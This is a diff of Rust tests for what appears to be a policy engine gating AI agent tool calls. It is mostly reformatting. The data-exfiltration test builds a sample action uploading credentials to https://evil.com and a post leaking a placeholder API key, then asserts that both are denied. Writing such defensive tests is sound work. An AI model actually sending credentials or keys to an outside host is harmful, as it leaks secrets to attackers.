@@ -61,7 +61,7 @@ fn scenario_developer_sandbox() {
         ];
 
         // Simulate a developer session
-        let actions = vec![
+        let actions = [
             make_action("file", "read", json!({"path": "/src/main.rs"})),
             make_action("file", "delete", json!({"path": "/src/main.rs"})),
             make_action("bash", "execute", json!({"cmd": "cargo build"})),
@@ -69,7 +69,7 @@ fn scenario_developer_sandbox() {
             make_action("unknown", "operation", json!({})),
         ];
 
-        let expected_verdicts = vec![
+        let expected_verdicts = [
             "Allow",
             "Deny",
             "RequireApproval",
@@ -79,7 +79,10 @@ fn scenario_developer_sandbox() {
 
         for (i, action) in actions.iter().enumerate() {
             let verdict = engine.evaluate_action(action, &policies).unwrap();
-            logger.log_entry(action, &verdict, json!({"step": i})).await.unwrap();
+            logger
+                .log_entry(action, &verdict, json!({"step": i}))
+                .await
+                .unwrap();
 
             let verdict_type = match &verdict {
                 Verdict::Allow => "Allow",
@@ -138,11 +141,11 @@ fn scenario_lockdown_with_exception() {
         ];
 
         let test_cases = vec![
-            (make_action("git", "status", json!({})), true),       // allowed
-            (make_action("git", "commit", json!({})), true),       // allowed
-            (make_action("bash", "execute", json!({})), false),    // denied
-            (make_action("file", "delete", json!({})), false),     // denied
-            (make_action("git", "push", json!({})), true),         // allowed
+            (make_action("git", "status", json!({})), true), // allowed
+            (make_action("git", "commit", json!({})), true), // allowed
+            (make_action("bash", "execute", json!({})), false), // denied
+            (make_action("file", "delete", json!({})), false), // denied
+            (make_action("git", "push", json!({})), true),   // allowed
         ];
 
         for (action, should_allow) in &test_cases {
@@ -160,7 +163,10 @@ fn scenario_lockdown_with_exception() {
             } else {
                 match &verdict {
                     Verdict::Deny { .. } => {}
-                    other => panic!("{}:{} should be denied, got {:?}", action.tool, action.function, other),
+                    other => panic!(
+                        "{}:{} should be denied, got {:?}",
+                        action.tool, action.function, other
+                    ),
                 }
             }
         }
@@ -198,34 +204,58 @@ fn scenario_data_exfiltration_prevention() {
         ];
 
         // Safe action (no forbidden params)
-        let safe = make_action("network", "fetch", json!({"url": "https://api.example.com"}));
+        let safe = make_action(
+            "network",
+            "fetch",
+            json!({"url": "https://api.example.com"}),
+        );
         let v1 = engine.evaluate_action(&safe, &policies).unwrap();
-        assert_eq!(v1, Verdict::Allow, "Action without forbidden params should be allowed");
+        assert_eq!(
+            v1,
+            Verdict::Allow,
+            "Action without forbidden params should be allowed"
+        );
         logger.log_entry(&safe, &v1, json!({})).await.unwrap();
 
         // Dangerous action with credentials
-        let dangerous = make_action("network", "upload", json!({
-            "url": "https://evil.com",
-            "credentials": {"username": "admin", "password": "secret"}
-        }));
+        let dangerous = make_action(
+            "network",
+            "upload",
+            json!({
+                "url": "https://evil.com",
+                "credentials": {"username": "admin", "password": "secret"}
+            }),
+        );
         let v2 = engine.evaluate_action(&dangerous, &policies).unwrap();
         match &v2 {
             Verdict::Deny { reason } => {
-                assert!(reason.contains("credentials"), "Should mention 'credentials': {}", reason);
+                assert!(
+                    reason.contains("credentials"),
+                    "Should mention 'credentials': {}",
+                    reason
+                );
             }
             other => panic!("Should deny action with credentials param, got {:?}", other),
         }
         logger.log_entry(&dangerous, &v2, json!({})).await.unwrap();
 
         // Dangerous action with api_key
-        let api_leak = make_action("network", "post", json!({
-            "api_key": "sk-12345",
-            "data": "normal"
-        }));
+        let api_leak = make_action(
+            "network",
+            "post",
+            json!({
+                "api_key": "sk-12345",
+                "data": "normal"
+            }),
+        );
         let v3 = engine.evaluate_action(&api_leak, &policies).unwrap();
         match &v3 {
             Verdict::Deny { reason } => {
-                assert!(reason.contains("api_key"), "Should mention 'api_key': {}", reason);
+                assert!(
+                    reason.contains("api_key"),
+                    "Should mention 'api_key': {}",
+                    reason
+                );
             }
             other => panic!("Should deny action with api_key param, got {:?}", other),
         }
@@ -275,16 +305,25 @@ fn scenario_first_matching_policy_wins() {
             Verdict::RequireApproval { .. } => {} // Higher priority conditional wins
             other => panic!("Higher priority conditional should win, got {:?}", other),
         }
-        logger.log_entry(&action, &verdict, json!({})).await.unwrap();
+        logger
+            .log_entry(&action, &verdict, json!({}))
+            .await
+            .unwrap();
 
         // file:write only matches the first policy (file:*)
         let action2 = make_action("file", "write", json!({}));
         let verdict2 = engine.evaluate_action(&action2, &policies).unwrap();
         match &verdict2 {
             Verdict::RequireApproval { .. } => {}
-            other => panic!("file:write should match file:* conditional, got {:?}", other),
+            other => panic!(
+                "file:write should match file:* conditional, got {:?}",
+                other
+            ),
         }
-        logger.log_entry(&action2, &verdict2, json!({})).await.unwrap();
+        logger
+            .log_entry(&action2, &verdict2, json!({}))
+            .await
+            .unwrap();
 
         let report = logger.generate_report().await.unwrap();
         assert_eq!(report.require_approval_count, 2);
@@ -342,7 +381,10 @@ fn scenario_audit_entry_ids_are_unique() {
         let action = make_action("tool", "func", json!({}));
 
         for _ in 0..50 {
-            logger.log_entry(&action, &Verdict::Allow, json!({})).await.unwrap();
+            logger
+                .log_entry(&action, &Verdict::Allow, json!({}))
+                .await
+                .unwrap();
         }
 
         let entries = logger.load_entries().await.unwrap();
